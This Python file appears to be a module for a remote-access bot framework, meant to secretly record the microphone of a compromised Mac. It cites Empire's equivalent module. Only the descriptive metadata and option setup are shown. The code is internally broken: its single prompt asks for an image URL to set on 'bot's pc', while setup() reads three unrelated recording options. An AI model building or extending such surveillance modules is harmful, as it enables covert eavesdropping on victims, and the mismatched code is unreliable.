from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self):
        return {
            "Author:": ["Marten4n6"],
            "Description": "Record the microphone.",
            "References": [
                "https://github.com/EmpireProject/Empire/blob/master/lib/modules/python/collection/osx/osx_mic_record.py",
                "https://developer.apple.com/documentation/avfoundation/avaudiorecorder"
            ],
            "Stoppable": False
        }

    def get_setup_messages(self):
        return [
            ["Url of Image you want to set to bot's pc: ",'missy']
        ]

    def setup(self, set_options):
        record_time = set_options[0]
        output_dir = set_options[1]
        output_name = set_options[2]

        if not record_time:
            record_time = 5
        if not output_dir:
            output_dir = "/tmp"
        if not output_name:
            output_name = random_string(8)

        return True, {
            "record_time": record_time,
            "output_dir": output_dir,
            "output_name": output_name
        }
